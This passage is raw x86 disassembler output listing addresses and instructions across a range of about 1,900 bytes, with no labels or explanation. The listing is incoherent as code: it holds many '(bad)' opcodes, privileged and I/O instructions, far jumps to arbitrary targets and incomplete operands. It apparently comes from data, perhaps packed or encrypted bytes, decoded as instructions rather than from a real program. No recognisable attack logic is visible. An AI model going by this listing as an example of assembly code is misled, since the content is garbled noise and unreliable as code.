  418cae:	jo     0x418cff
  418cb0:	out    dx,al
  418cb1:	rol    edx,0x2
  418cb4:	stos   DWORD PTR es:[edi],eax
  418cb5:	shl    BYTE PTR [ecx+0x16826b39],cl
  418cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cbc:	pop    ds
  418cbd:	pusha  
  418cbe:	pop    esi
  418cbf:	ret    
  418cc0:	loop   0x418d10
  418cc2:	and    DWORD PTR [ebx+edx*2+0x4c],edx
  418cc6:	repnz fdiv QWORD PTR [esi]
  418cc9:	push   edx
  418cca:	stc    
  418ccb:	fsub   QWORD PTR [edi-0x6d025458]
  418cd1:	push   ecx
  418cd2:	ins    BYTE PTR es:[edi],dx
  418cd3:	ins    BYTE PTR es:[edi],dx
  418cd4:	sub    al,0xd3
  418cd6:	mov    esp,DWORD PTR ds:0xecb1e552
  418cdc:	add    ah,ah
  418cde:	mov    ah,0x25
  418ce0:	popa   
  418ce1:	iret   
  418ce2:	push   esi
  418ce3:	push   ecx
  418ce4:	xchg   BYTE PTR [esi],al
  418ce6:	imul   edi,DWORD PTR [edi+0x69c40a68],0x4a
  418ced:	xchg   edx,eax
  418cee:	arpl   WORD PTR [ebx-0x4220de0f],di
  418cf4:	cwde   
  418cf5:	cdq    
  418cf6:	xchg   edx,eax
  418cf7:	aaa    
  418cf8:	sahf   
  418cf9:	jmp    0x418cbd
  418cfb:	cli    
  418cfc:	add    eax,0x6c14cd34
  418d01:	fisttp QWORD PTR [ebp+0x23]
  418d04:	add    esi,esi
  418d06:	jmp    0x418c90
  418d08:	rol    BYTE PTR [ebx],cl
  418d0a:	mov    ecx,0x20471f27
  418d0f:	test   al,0xb4
  418d11:	(bad)  
  418d12:	jl     0x418c94
  418d14:	popa   
  418d15:	dec    edi
  418d16:	(bad)  
  418d17:	mov    ebx,0x95c07d44
  418d1c:	sub    ebx,edi
  418d1e:	cli    
  418d1f:	sub    bl,BYTE PTR [edx]
  418d21:	jns    0x418d2f
  418d23:	push   ebp
  418d24:	je     0x418d4c
  418d26:	push   ds
  418d27:	aad    0x86
  418d29:	js     0x418ce9
  418d2b:	adc    ch,BYTE PTR [ecx]
  418d2d:	dec    eax
  418d2e:	push   0xe05f0fc0
  418d33:	mov    edx,0xe18541f0
  418d38:	shl    BYTE PTR [edi-0x5d],1
  418d3b:	ja     0x418d90
  418d3d:	adc    eax,0x5f566c16
  418d42:	call   0x76465a36
  418d47:	add    BYTE PTR [ecx],0x1c
  418d4a:	imul   ecx,ecx,0x5026994e
  418d50:	das    
  418d51:	cmp    eax,0xd2606cf0
  418d56:	arpl   bp,dx
  418d58:	mov    esi,0x42f4e1d8
  418d5d:	sbb    eax,0x2bc78462
  418d62:	cmp    BYTE PTR [edi+0x5d32203f],dh
  418d68:	mov    eax,ds:0xcc6aef12
  418d6d:	arpl   WORD PTR [esp+edi*1-0x73],di
  418d71:	imul   ecx,DWORD PTR [edi+0x5538e0b9],0x61
  418d78:	inc    esp
  418d79:	pop    ss
  418d7a:	fiadd  WORD PTR [edi-0x78767945]
  418d80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418d81:	sbb    BYTE PTR [edi+eiz*2],dh
  418d84:	mov    esi,0xf3977bc7
  418d89:	ret    
  418d8a:	daa    
  418d8b:	les    eax,FWORD PTR [ebx+0x5d7e40a8]
  418d91:	mov    al,ds:0x5187081b
  418d96:	ror    DWORD PTR [ecx],cl
  418d98:	mov    dh,0x22
  418d9a:	adc    BYTE PTR [eax+0x3cd08c69],dl
  418da0:	retf   0xcb65
  418da3:	mov    edx,DWORD PTR [esi+0x25]
  418da6:	lea    ecx,[ecx]
  418da8:	or     BYTE PTR [edx],al
  418daa:	int    0x9e
  418dac:	icebp  
  418dad:	xchg   ebp,eax
  418dae:	xchg   DWORD PTR [eax-0x7c287613],ecx
  418db4:	inc    ecx
  418db5:	test   al,0xa3
  418db7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418db8:	mov    eax,0xd9f7bc8d
  418dbd:	mov    eax,edx
  418dbf:	ds jmp 0x418e23
  418dc2:	nop
  418dc3:	shl    ah,1
  418dc5:	aad    0xf0
  418dc7:	in     eax,dx
  418dc8:	xor    DWORD PTR [ebx-0x42490a6d],esp
  418dce:	and    al,BYTE PTR [ecx+0x59]
  418dd1:	lds    esp,FWORD PTR [ebx]
  418dd3:	daa    
  418dd4:	jmp    0x94f2:0x3ce74d9
  418ddb:	sub    esp,DWORD PTR [edi+0x7eaa5c1a]
  418de1:	sbb    bh,BYTE PTR [edi-0x7d]
  418de4:	mov    edi,0x7b8c3f1c
  418de9:	pop    eax
  418dea:	in     al,0x16
  418dec:	cmp    BYTE PTR [edx],0x19
  418def:	popa   
  418df0:	cli    
  418df1:	push   esp
  418df2:	je     0x418dd0
  418df4:	mov    BYTE PTR [ebx],bh
  418df6:	pushf  
  418df7:	mov    ds:0x3d810e61,eax
  418dfc:	mov    bl,0x6
  418dfe:	xor    al,0xb5
  418e00:	mov    cs,WORD PTR [edi-0x6647ae9b]
  418e06:	jp     0x418dfa
  418e08:	loop   0x418da6
  418e0a:	jl     0x418e5a
  418e0c:	(bad)  
  418e0e:	call   0x8ea8:0x7bf60a5d
  418e15:	mov    ecx,0xf8e2812
  418e1a:	or     edi,edi
  418e1c:	test   eax,0x37cde201
  418e21:	dec    ebx
  418e22:	jl     0x418e43
  418e24:	xchg   ebp,eax
  418e25:	cmp    esp,DWORD PTR [esi+0x5a]
  418e28:	idiv   BYTE PTR [ebx]
  418e2a:	push   ebp
  418e2b:	jae    0x418e84
  418e2d:	retf   0x4393
  418e30:	and    DWORD PTR [ebx+0x463c220d],ecx
  418e36:	xchg   ecx,eax
  418e37:	scas   al,BYTE PTR es:[edi]
  418e38:	ret    0x4343
  418e3b:	int    0xd7
  418e3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e3e:	mov    ch,0x6f
  418e40:	xor    eax,0xe2985f8a
  418e45:	sbb    BYTE PTR [ecx-0xd],ah
  418e48:	jge    0x418ea7
  418e4a:	push   ecx
  418e4b:	stos   DWORD PTR es:[edi],eax
  418e4c:	xchg   DWORD PTR [esi-0x12479c0d],esp
  418e52:	mov    ch,0x1b
  418e54:	dec    esp
  418e55:	sbb    esi,edx
  418e57:	loop   0x418e69
  418e59:	fistp  WORD PTR [edi+0x5c]
  418e5c:	lods   eax,DWORD PTR ds:[esi]
  418e5d:	test   BYTE PTR [ecx],0x1c
  418e60:	lahf   
  418e61:	shr    DWORD PTR [esi+edi*8-0x70],0x1d
  418e66:	sub    ah,BYTE PTR [edi-0x59]
  418e69:	(bad)  
  418e6a:	repnz mov ch,0x2e
  418e6d:	pop    ss
  418e6e:	pop    edx
  418e6f:	xchg   DWORD PTR [edx+0x7de9d67c],edx
  418e75:	inc    esi
  418e76:	adc    ah,BYTE PTR [ecx-0x6132b77d]
  418e7c:	pop    ecx
  418e7d:	cmp    al,BYTE PTR [esi]
  418e7f:	xchg   ecx,eax
  418e80:	sbb    DWORD PTR [ecx],ebx
  418e82:	shr    BYTE PTR [edi-0x3c],cl
  418e85:	loop   0x418e1d
  418e87:	mov    eax,0xaa2b20b6
  418e8c:	fist   DWORD PTR [ebx+eax*1]
  418e8f:	std    
  418e90:	rcl    DWORD PTR [eax-0x2c],0xf1
  418e94:	or     ebx,ebp
  418e96:	pushf  
  418e97:	push   es
  418e98:	out    dx,al
  418e99:	and    eax,0x98e8cfa8
  418e9e:	aas    
  418e9f:	lock aad 0xa5
  418ea2:	mov    esp,DWORD PTR [edi]
  418ea4:	cld    
  418ea5:	sbb    dh,BYTE PTR [ebx]
  418ea7:	inc    eax
  418ea8:	fist   WORD PTR [esi]
  418eaa:	sahf   
  418eab:	lods   al,BYTE PTR ds:[esi]
  418eac:	daa    
  418ead:	cmp    al,0xbc
  418eaf:	and    al,0xfd
  418eb1:	lahf   
  418eb2:	push   ebp
  418eb3:	ret    
  418eb4:	dec    ebx
  418eb5:	mov    edi,0x288b52ea
  418eba:	mov    eax,ds:0x2d6442dd
  418ebf:	aas    
  418ec0:	je     0x418f08
  418ec2:	cmp    al,0x15
  418ec4:	mov    ebp,0xe925c4ef
  418ec9:	fdivp  st(4),st
  418ecb:	sahf   
  418ecc:	xchg   BYTE PTR [ecx],ch
  418ece:	sub    eax,0x67681fa9
  418ed3:	push   es
  418ed4:	iret   
  418ed5:	mov    bl,0xaf
  418ed7:	inc    ebp
  418ed8:	push   0xffffff90
  418eda:	sbb    eax,0x44fac0da
  418edf:	sub    al,0x29
  418ee1:	lahf   
  418ee2:	cmp    al,0xaf
  418ee4:	je     0x418f2d
  418ee6:	xlat   BYTE PTR ds:[ebx]
  418ee7:	test   al,0xcb
  418ee9:	fcomp  DWORD PTR [eax+0x53780d12]
  418eef:	push   edi
  418ef0:	lods   al,BYTE PTR ds:[esi]
  418ef1:	mov    edi,DWORD PTR [edx-0x49]
  418ef4:	ins    DWORD PTR es:[edi],dx
  418ef5:	push   edi
  418ef6:	pop    esp
  418ef7:	xchg   esi,eax
  418ef8:	std    
  418ef9:	ret    
  418efa:	add    DWORD PTR [ebp-0x282335ba],esp
  418f00:	pusha  
  418f01:	test   al,0xdd
  418f03:	push   eax
  418f04:	push   esp
  418f05:	jmp    0x99246add
  418f0a:	inc    edx
  418f0b:	pop    esp
  418f0c:	mov    ds:0x820c64a6,al
  418f11:	stos   BYTE PTR es:[edi],al
  418f12:	mov    BYTE PTR [ebx],bl
  418f14:	nop
  418f15:	das    
  418f16:	jl     0x418f80
  418f18:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f19:	ins    DWORD PTR es:[edi],dx
  418f1a:	xor    BYTE PTR [ecx+0x1c4f809a],dh
  418f20:	jmp    0xac18:0xd70dd546
  418f27:	cwd    
  418f29:	int3   
  418f2a:	mov    ebp,0x59c49534
  418f2f:	jno    0x418fa4
  418f31:	mov    gs,ecx
  418f33:	int    0xc7
  418f35:	mov    edi,0xf81784c3
  418f3a:	jae    0x418f2d
  418f3c:	or     dl,BYTE PTR [ecx+eiz*1-0x50]
  418f40:	mov    bl,0xcb
  418f42:	pop    es
  418f43:	aaa    
  418f44:	shl    DWORD PTR [esi+0x560dc103],cl
  418f4a:	sahf   
  418f4b:	clc    
  418f4c:	retf   0xb1ca
  418f4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418f50:	fcom   DWORD PTR [eax+0x6b8a75ad]
  418f56:	divps  xmm7,XMMWORD PTR [eax]
  418f59:	shr    ch,1
  418f5b:	stc    
  418f5c:	xlat   BYTE PTR ds:[ebx]
  418f5d:	inc    edx
  418f5e:	xor    edi,eax
  418f60:	pop    ebx
  418f61:	jle    0x418fcb
  418f63:	mov    eax,ds:0xfb9c2600
  418f68:	push   0xf75023b2
  418f6d:	lods   al,BYTE PTR ds:[esi]
  418f6e:	sub    DWORD PTR [edi-0x6f],ebp
  418f71:	inc    edi
  418f72:	sub    BYTE PTR ds:0xed58ee91,dh
  418f78:	in     eax,0xa6
  418f7a:	sbb    DWORD PTR [eax+0x37b03d90],ebp
  418f80:	aaa    
  418f81:	(bad)  
  418f82:	rcl    DWORD PTR [ecx-0x61],cl
  418f85:	jl     0x418f09
  418f87:	pusha  
  418f88:	inc    esi
  418f89:	mov    dh,0xcb
  418f8b:	(bad)  
  418f8c:	shl    DWORD PTR [eax],cl
  418f8e:	mov    es,WORD PTR [edi-0x1c474201]
  418f94:	adc    edi,DWORD PTR [ebp+0x5ec95a34]
  418f9a:	jmp    0x41900a
  418f9c:	mov    esp,0xe6824671
  418fa1:	leave  
  418fa2:	sti    
  418fa3:	imul   BYTE PTR [edi]
  418fa5:	sub    eax,0xfa4135f7
  418faa:	add    al,0xa5
  418fac:	cmc    
  418fad:	sbb    bl,BYTE PTR ds:0x9646937c
  418fb3:	fidiv  WORD PTR [ebx-0xac91793]
  418fb9:	rcl    BYTE PTR [edi+0x25],1
  418fbc:	push   esp
  418fbd:	cmp    bl,BYTE PTR [edi+0x148edef9]
  418fc3:	cli    
  418fc4:	xchg   esi,eax
  418fc5:	ret    
  418fc6:	mov    bh,0x5
  418fc8:	ins    BYTE PTR es:[edi],dx
  418fc9:	ror    ah,1
  418fcb:	jp     0x418f7c
  418fcd:	sbb    DWORD PTR [ebx-0x37],edi
  418fd0:	pop    ss
  418fd1:	les    ebp,FWORD PTR [ebp-0x772bd91d]
  418fd7:	enter  0xeb6c,0x32
  418fdb:	repnz pop ebp
  418fdd:	leave  
  418fde:	xor    BYTE PTR [edx-0x52],ah
  418fe1:	test   al,0x51
  418fe3:	loopne 0x41904b
  418fe5:	and    DWORD PTR [ecx],edx
  418fe7:	jmp    0x418f8d
  418fe9:	pop    eax
  418fea:	cmp    al,0x7a
  418fec:	pop    ss
  418fed:	ror    DWORD PTR [edx],0x90
  418ff0:	(bad)  
  418ff2:	(bad)  
  418ff3:	mov    ebx,0x5c263ae4
  418ff8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ff9:	jge    0x41904c
  418ffb:	in     eax,0x94
  418ffd:	lods   eax,DWORD PTR ds:[esi]
  418ffe:	ins    BYTE PTR es:[edi],dx
  418fff:	fdiv   DWORD PTR [esi-0x406325b2]
  419005:	jge    0x418fdc
  419007:	xchg   DWORD PTR gs:[ebx],eax
  41900a:	ins    BYTE PTR es:[edi],dx
  41900b:	out    0xb8,al
  41900d:	jecxz  0x419033
  41900f:	dec    edi
  419010:	aaa    
  419011:	leave  
  419012:	sbb    BYTE PTR [esi+0x2e7d4875],ah
  419018:	retf   
  419019:	and    eax,0x11203fc6
  41901e:	into   
  41901f:	test   BYTE PTR [edx+0x51],ah
  419022:	mov    ecx,0x1dcdc068
  419027:	xchg   esi,eax
  419028:	pop    ebp
  419029:	(bad)  
  41902a:	lock outs dx,DWORD PTR ds:[esi]
  41902c:	cmp    BYTE PTR [eax+ecx*4-0x70],cl
  419030:	or     DWORD PTR [edi-0x79],ebp
  419033:	ror    DWORD PTR [ebx-0xd97119e],cl
  419039:	cmp    BYTE PTR [ecx+0x60],0x78
  41903d:	jbe    0x418ff0
  41903f:	add    dh,0x81
  419042:	leave  
  419043:	jmp    0xd694955e
  419048:	cmp    ecx,DWORD PTR [ebx]
  41904a:	add    DWORD PTR [esi+0xf],0xe80b4f18
  419051:	fstp   DWORD PTR [esi+ebp*8+0x70]
  419055:	repz mov bh,0x7e
  419058:	xor    dh,ah
  41905a:	(bad)  
  41905b:	jae    0x4190bc
  41905d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41905e:	pushf  
  41905f:	outs   dx,DWORD PTR ds:[esi]
  419060:	push   esi
  419061:	sub    edi,edx
  419063:	in     al,0x3
  419065:	popa   
  419066:	popf   
  419067:	and    eax,0x2ebdaa27
  41906c:	add    edi,DWORD PTR ds:0xa42e414d
  419072:	call   0xaaad42fc
  419077:	add    DWORD PTR [ecx],ecx
  419079:	add    ebx,DWORD PTR [edx-0x38d4141e]
  41907f:	sti    
  419080:	or     BYTE PTR [ebp-0x23],al
  419083:	sbb    cl,BYTE PTR ds:0x66045dc6
  419089:	mov    dl,0x66
  41908b:	adc    ebx,esi
  41908d:	fbstp  TBYTE PTR [ecx-0x34]
  419090:	cmp    BYTE PTR [edx],al
  419092:	mov    cl,0x39
  419094:	das    
  419095:	pop    ss
  419096:	jmp    0xd5a7:0xf6f4bf10
  41909d:	iret   
  41909e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41909f:	add    eax,0x480e110b
  4190a4:	jae    0x41905c
  4190a6:	push   0x9b8682d1
  4190ab:	mul    bh
  4190ad:	mov    bh,0x19
  4190af:	push   ss
  4190b0:	and    bh,BYTE PTR [eax+0x2e]
  4190b3:	das    
  4190b4:	adc    ch,dl
  4190b6:	sbb    BYTE PTR [edx+0x7c41b348],0x54
  4190bd:	sbb    bl,BYTE PTR [edi]
  4190bf:	jne    0x4190ef
  4190c1:	xchg   BYTE PTR [ecx+0x68],bl
  4190c4:	aad    0xc2
  4190c6:	jnp    0xf509168a
  4190cc:	mov    al,ds:0xea9daaab
  4190d1:	push   cs
  4190d2:	inc    ebp
  4190d3:	inc    esp
  4190d4:	test   DWORD PTR [edi+0x12],ebx
  4190d7:	mov    gs,WORD PTR [eax+eiz*2+0x66d5cd36]
  4190de:	sbb    esp,ebp
  4190e0:	cmp    al,0x12
  4190e2:	mov    edx,0x50915f94
  4190e7:	(bad)  
  4190e8:	out    0x9d,al
  4190ea:	aad    0x31
  4190ec:	and    ecx,DWORD PTR [ecx]
  4190ee:	popf   
  4190ef:	les    ebx,FWORD PTR [edx+0x10]
  4190f2:	rcl    DWORD PTR [ebx+0x3b8cc7a7],0x5e
  4190f9:	mov    ecx,0xb0628891
  4190fe:	dec    eax
  4190ff:	dec    ebp
  419100:	push   esp
  419101:	inc    edx
  419102:	(bad)  
  419103:	gs pop edi
  419105:	xchg   dh,dh
  419107:	dec    ecx
  419108:	cli    
  419109:	jnp    0x4190b1
  41910b:	idiv   BYTE PTR [edx]
  41910d:	cs add ecx,eax
  419110:	icebp  
  419111:	inc    edx
  419112:	xchg   esp,eax
  419113:	fiadd  WORD PTR [edi]
  419115:	(bad)  
  419116:	or     bl,BYTE PTR [edx]
  419118:	scas   eax,DWORD PTR es:[edi]
  419119:	pop    ecx
  41911a:	mov    ds,WORD PTR [ebx+0x7922ebc6]
  419120:	mov    edi,0xd92ea7ac
  419125:	clc    
  419126:	aam    0x75
  419128:	inc    esi
  419129:	int    0xa0
  41912b:	push   es
  41912c:	lea    ebx,[esi+ebx*2+0x7b84ee57]
  419133:	xor    ebx,DWORD PTR [ebp-0x69]
  419136:	pop    ebp
  419137:	and    eax,0x266c2445
  41913c:	push   esp
  41913d:	hlt    
  41913e:	jecxz  0x4191a7
  419140:	xchg   edx,eax
  419141:	scas   eax,DWORD PTR es:[edi]
  419142:	lea    ebx,[edx+esi*8]
  419145:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419146:	push   edx
  419147:	sbb    edx,edx
  419149:	pop    esp
  41914a:	jmp    0x4191b3
  41914c:	ss scas al,BYTE PTR es:[edi]
  41914e:	mov    eax,ds:0xec4051a0
  419153:	out    0xaa,eax
  419155:	in     al,0x44
  419157:	into   
  419158:	push   ebp
  419159:	and    BYTE PTR [edi+0x7],bl
  41915c:	push   edi
  41915d:	jg     0x41914a
  41915f:	ja     0x4190e5
  419161:	dec    ebx
  419162:	stos   BYTE PTR es:[edi],al
  419163:	(bad)  
  419164:	call   DWORD PTR [eax]
  419166:	push   ds
  419167:	jp     0x419188
  419169:	cmp    al,0x46
  41916b:	pop    ss
  41916c:	push   0xffffffac
  41916e:	mov    ecx,0x395c9a12
  419173:	inc    BYTE PTR [ebx-0x559ae17e]
  419179:	pop    edx
  41917a:	out    0x80,al
  41917c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41917d:	nop
  41917e:	dec    edx
  41917f:	stos   BYTE PTR es:[edi],al
  419180:	inc    edx
  419181:	dec    eax
  419182:	push   cs
  419183:	cwde   
  419184:	jmp    0xcb95:0x3b7756b9
  41918b:	sub    al,0x93
  41918d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41918e:	mov    BYTE PTR [esi],0xe0
  419191:	sub    esi,ebp
  419193:	fwait
  419194:	outs   dx,BYTE PTR ds:[esi]
  419195:	push   ebx
  419196:	popf   
  419197:	jmp    0xab3a3e53
  41919c:	shr    BYTE PTR [edi],1
  41919e:	sbb    esp,DWORD PTR [eax+0x4c]
  4191a1:	mov    esp,DWORD PTR [eax-0x4a]
  4191a4:	aas    
  4191a5:	cwde   
  4191a6:	mov    bh,0x77
  4191a8:	sbb    BYTE PTR [ebx-0x6a1ccd76],bh
  4191ae:	mov    al,0x53
  4191b0:	inc    esi
  4191b1:	xor    BYTE PTR [esi+ecx*2-0x5eb67eeb],ah
  4191b8:	jmp    DWORD PTR [eax-0x747eaa2d]
  4191be:	fs call 0xfb769c22
  4191c4:	and    DWORD PTR [eax],esi
  4191c6:	sahf   
  4191c7:	jl     0x419219
  4191c9:	pop    ecx
  4191ca:	arpl   WORD PTR [edi],di
  4191cc:	adc    BYTE PTR [eax],0xb3
  4191cf:	clc    
  4191d0:	or     DWORD PTR [eax+0x58ebe70e],esi
  4191d6:	ins    BYTE PTR es:[edi],dx
  4191d7:	pop    eax
  4191d8:	mov    esi,0x15c3d01e
  4191dd:	in     al,0x73
  4191df:	(bad)  
  4191e0:	mov    esi,0xedb6e6be
  4191e5:	jns    0x419240
  4191e7:	je     0x419197
  4191e9:	and    al,0x47
  4191eb:	sbb    eax,0x47a657c8
  4191f0:	dec    edx
  4191f1:	icebp  
  4191f2:	or     DWORD PTR [eax],0xffffffff
  4191f5:	mov    bl,0xd0
  4191f7:	aam    0x63
  4191f9:	cs dec edi
  4191fb:	icebp  
  4191fc:	shr    DWORD PTR [ebp-0x2001e4a7],1
  419202:	daa    
  419203:	or     BYTE PTR [esi+0x15],0xc3
  419207:	push   eax
  419208:	pop    edi
  419209:	div    BYTE PTR [ebp+0x3f]
  41920c:	shr    ah,cl
  41920e:	pop    esp
  41920f:	xchg   esi,eax
  419210:	loopne 0x4191ed
  419212:	shl    BYTE PTR [eax+0x4cb00397],0xe8
  419219:	das    
  41921a:	sar    edx,0x7d
  41921d:	scas   al,BYTE PTR es:[edi]
  41921e:	lods   al,BYTE PTR ds:[esi]
  41921f:	(bad)  
  419220:	pop    ecx
  419221:	fisub  WORD PTR [edx-0x65c3b7a3]
  419227:	inc    esp
  419228:	cmp    DWORD PTR [ecx+0x5fe09d03],0xffffffca
  41922f:	addr16 push es
  419231:	rol    BYTE PTR [ebx],0xf4
  419234:	sub    BYTE PTR [edi],ah
  419236:	ja     0x419294
  419238:	inc    ebp
  419239:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41923b:	arpl   WORD PTR [ebx-0x511092cd],sp
  419241:	push   eax
  419242:	jb     0x4192bb
  419244:	mov    dl,0xee
  419246:	in     eax,0x2d
  419248:	or     edx,DWORD PTR [edx-0x412129e0]
  41924e:	cmp    edx,DWORD PTR [edi-0x621f47ea]
  419254:	push   ebp
  419255:	inc    ebp
  419256:	repnz test DWORD PTR [edx],0x52d3a2cd
  41925d:	adc    eax,0x5cc4301e
  419262:	aas    
  419263:	pop    eax
  419264:	push   0xffffffad
  419266:	pop    ebp
  419267:	add    eax,0xcc2dc059
  41926c:	xor    bl,BYTE PTR [bp+si-0x18]
  419270:	inc    eax
  419271:	aas    
  419272:	mov    ds:0x2072c59f,al
  419277:	arpl   WORD PTR [eax],dx
  419279:	mov    dh,0xfc
  41927b:	or     eax,0x27aa88b8
  419280:	pushf  
  419281:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419282:	xor    bl,cl
  419284:	mov    cl,0x1d
  419286:	daa    
  419287:	fwait
  419288:	fs js  0x419220
  41928b:	aaa    
  41928c:	and    ebp,DWORD PTR [edx+edi*1-0x3b78516f]
  419293:	and    eax,0x2a99f01
  419298:	iret   
  419299:	pop    ecx
  41929a:	mov    edi,0x41d5e2
  41929f:	jb     0x419234
  4192a1:	daa    
  4192a2:	sub    al,0x98
  4192a4:	or     DWORD PTR [ebp+0x37d30322],ebx
  4192aa:	xor    al,0xbf
  4192ac:	arpl   WORD PTR [ebx+0x2],bx
  4192af:	cmp    al,0xab
  4192b1:	jl     0x41926d
  4192b3:	and    BYTE PTR [edi-0x29],0xa2
  4192b7:	pop    ds
  4192b8:	jmp    FWORD PTR [eax]
  4192ba:	cwde   
  4192bb:	test   DWORD PTR [edx-0x1696128f],ebx
  4192c1:	gs jb  0x4192b7
  4192c4:	fimul  DWORD PTR [ebp+0x41]
  4192c7:	shl    dl,1
  4192c9:	xor    esi,ebx
  4192cb:	retf   0x2f0c
  4192ce:	test   BYTE PTR [edi-0x18222e76],dh
  4192d4:	icebp  
  4192d5:	ret    0xd1b7
  4192d8:	and    edx,esi
  4192da:	xchg   esp,eax
  4192db:	mov    ds:0x784055c7,eax
  4192e0:	inc    esi
  4192e1:	mov    eax,ds:0x56c108f7
  4192e6:	pop    edi
  4192e7:	jne    0x419316
  4192e9:	push   eax
  4192ea:	add    ecx,esi
  4192ec:	je     0x41935b
  4192ee:	hlt    
  4192ef:	fstp   DWORD PTR [edx]
  4192f1:	sti    
  4192f2:	sbb    eax,0x174afdb9
  4192f7:	xor    al,0x8d
  4192f9:	add    BYTE PTR [edi],ah
  4192fb:	aad    0xd1
  4192fd:	addr16 xchg edi,eax
  4192ff:	fdivr  st,st(0)
  419301:	addr16 jne 0x4192e2
  419304:	add    al,BYTE PTR [esi-0x1bc1eefe]
  41930a:	and    DWORD PTR [ebx+0x446d4938],edx
  419310:	rol    ah,1
  419312:	(bad)  
  419313:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419314:	pusha  
  419315:	int3   
  419316:	xor    BYTE PTR [ebp+0xe35117a],bl
  41931c:	fisttp DWORD PTR [esi+ebp*2]
  41931f:	leave  
  419320:	(bad)
  419323:	inc    esp
  419324:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419325:	push   cs
  419326:	xchg   ebx,eax
  419327:	mov    esi,0x54fa253c
  41932c:	mov    edx,0x635b6d38
  419331:	dec    edi
  419332:	or     al,0x9e
  419334:	(bad)  [esp+ebx*8+0x54]
  419338:	mov    al,ds:0x11fdd4d5
  41933d:	mov    al,0x8c
  41933f:	add    ch,BYTE PTR [edi+ebx*4+0x2]
  419343:	cmp    al,ah
  419345:	ret    0xf0c3
  419348:	sub    BYTE PTR [ebp+0x54],0xcc
  41934c:	push   edx
  41934d:	aas    
  41934e:	push   es
  41934f:	dec    ebx
  419350:	mov    al,0x1a
  419352:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419353:	icebp  
  419354:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419355:	call   0xba969225
  41935a:	test   ecx,eax
  41935c:	fimul  WORD PTR [eax+0xd]
  41935f:	rcl    BYTE PTR [eax],1
  419361:	adc    ebx,DWORD PTR [eax]
  419363:	outs   dx,DWORD PTR ds:[esi]
  419364:	out    dx,al
  419365:	mov    ch,0xf7
  419367:	jb     0x41938b
  419369:	fild   QWORD PTR [ebx-0x1c3d60a2]
  41936f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419370:	adc    esi,DWORD PTR [ebp-0x58]
  419373:	mov    edi,DWORD PTR [ebp+0x72f20528]
  419379:	xchg   edx,eax
  41937a:	cmp    DWORD PTR [esi+0x73ec0c30],esp
  419380:	mov    cl,0x3f
  419382:	mov    ebp,0xa87901f3
  419387:	push   ebx
  419388:	pop    esp
  419389:	pop    ebx
  41938a:	es mov edx,0x78ac1e90
  419390:	fstp   QWORD PTR [eax-0x1e]
  419393:	jo     0x419317
  419395:	mov    WORD PTR [ecx-0x6616ff6c],ss
  41939b:	mov    ah,0xe
  41939d:	xchg   ebp,eax
  41939e:	test   DWORD PTR [ebp+ebp*1+0x919da68],0x452bbc2c
  4193a9:	fs push edx
  4193ab:	ret    0xca0b
  4193ae:	stos   DWORD PTR es:[edi],eax
  4193af:	mov    WORD PTR [ebp+0x25],?
  4193b2:	ss jp  0x419369
  4193b5:	push   0xffffffe4
  4193b7:	in     eax,0xc
  4193b9:	fwait
  4193ba:	cmp    DWORD PTR [edi-0x19],edx
  4193bd:	mov    ch,0xb9
  4193bf:	fimul  WORD PTR [edx-0x70e8aa80]
  4193c5:	cmp    eax,0x8ec654d6
  4193ca:	jle    0x419421
  4193cc:	cli    
  4193cd:	xor    DWORD PTR [ebp-0x36],eax
  4193d0:	dec    ebx
  4193d1:	sub    eax,0xf58aa95f
  4193d6:	jmp    0x2754479f
  4193db:	fisub  DWORD PTR [esi-0x19ee24dd]
  4193e1:	push   edi
  4193e2:	stc    
  4193e3:	mov    WORD PTR [eax],?
  4193e5:	jp     0x41937f
  4193e7:	push   edi
  4193e8:	mov    edi,0xfc06dfaa
  4193ed:	js     0x419382
  4193ef:	jne    0x41939a
  4193f1:	icebp  
  4193f2:	test   DWORD PTR [eax-0x38a9fcf9],esp
  4193f8:	and    DWORD PTR [edx+0x62b2054e],esi
  4193fe:	lea    esi,[eax+0x13]
  419401:	jne    0x419464
  419403:	fiadd  DWORD PTR [edx+ecx*1]
  419406:	adc    ecx,DWORD PTR [ebp-0x3fd340b3]
  41940c:	stos   BYTE PTR es:[edi],al
  41940d:	mov    dh,0x2d
  41940f:	dec    edi
  419410:	sub    dl,BYTE PTR [eax]
  419412:	sbb    al,0xfe
  419414:	out    0x8,al
  419416:	ret    
  419417:	and    eax,0x9cccd3de
  41941c:	or     ebx,edx
  41941e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41941f:	(bad)  
  419420:	xchg   ebp,eax
  419421:	mov    bh,0x14
  419423:	rcr    BYTE PTR [eax],cl
  419425:	jmp    0x86cb839c
  41942a:	xchg   ebx,eax
  41942b:	and    dh,BYTE PTR [ecx-0x1534a2b8]
  419431:	dec    ebx
  419432:	inc    ecx
  419433:	(bad)  
  419434:	jo     0x41946d
  419436:	mov    cl,0xfc
  419438:	retf   
  419439:	mov    eax,0x7aec455a
  41943e:	xchg   esi,eax
  41943f:	add    BYTE PTR [ebp+0x1c53b0e3],bh
  419445:	aad    0x41
  419447:	rcr    DWORD PTR [ebx+ebx*8],cl
  41944a:	mov    ebp,DWORD PTR ds:[ebp+0x6b89afd7]
  419451:	xor    DWORD PTR [ecx-0xe],eax
  419454:	sub    BYTE PTR [ebp+0x63],ah
  419457:	sub    edx,DWORD PTR ds:0x65158158
  41945d:	iret   
  41945e:	or     ch,dl
